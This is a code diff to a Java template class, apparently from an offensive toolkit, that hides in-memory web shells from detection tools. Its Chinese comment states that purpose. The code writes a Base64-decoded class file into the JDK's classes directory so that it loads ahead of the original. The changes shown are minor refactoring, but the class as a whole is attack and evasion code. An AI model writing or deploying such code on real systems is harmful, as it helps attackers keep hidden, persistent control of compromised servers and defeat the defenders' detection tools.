@@ -10,10 +10,11 @@ import java.io.FileOutputStream;
  * 使常见的工具无法检测出系统内的内存马
  * 由于 classes 文件夹默认不存在，因此需要较高的读写权限
  */
+@SuppressWarnings("unused")
 public class HideMemShellTemplate extends ClassLoader {
-    static String b64;
+    static String b64 = "";
 
-    static String className;
+    static String className = "";
 
     static {
         try {
@@ -45,7 +46,7 @@ public class HideMemShellTemplate extends ClassLoader {
         File file = new File(javaHome + "/classes/" + className.replace(".", "/") + ".class");
 
         if (!file.getParentFile().exists()) {
-            file.getParentFile().mkdirs();
+            boolean ignored = file.getParentFile().mkdirs();
         }
 
         FileOutputStream fos = new FileOutputStream(file);
@@ -54,22 +55,8 @@ public class HideMemShellTemplate extends ClassLoader {
         fos.close();
     }
 
-    public static byte[] base64Decode(String bs) {
-        Class base64;
-        byte[] value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>) null).invoke(base64, (Object) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception ignored) {
-            }
-        }
-        return value;
+    public static byte[] base64Decode(String bs) throws Exception {
+        return ClassLoaderTemplate.base64Decode(bs);
     }
 
 
